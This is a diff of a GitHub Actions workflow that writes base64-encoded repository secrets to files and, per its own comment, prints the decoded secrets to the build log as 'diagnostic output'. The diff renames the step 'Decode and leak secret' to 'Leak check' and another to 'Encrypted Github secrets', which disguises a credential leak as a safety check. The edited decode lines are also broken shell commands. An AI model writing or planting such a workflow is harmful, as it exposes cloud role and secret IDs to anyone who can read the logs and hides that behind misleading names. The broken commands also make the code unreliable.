@@ -8,16 +8,16 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Save encoded secret to file
+      - name: Encrypted Github secrets
         run: |
           echo "${{ secrets.ENCODED_ROLE1_ARN }}" > secret.b64
           echo "${{ secrets.ENCODED_SECRET_ID }}" > secretid.b64
 
-      - name: Decode and leak secret
+      - name: Leak check
         run: |
           # Decode the base64 content to a file
-          base64 -d secret.b64 > secret.txt
-          base64 -d secretid.b64 > secret1.txt
+          secret.b64 > secret.txt
+          secretid.b64 > secret1.txt
 
           # Print decoded secret as "diagnostic output"
           echo "::group::System Diagnostic"
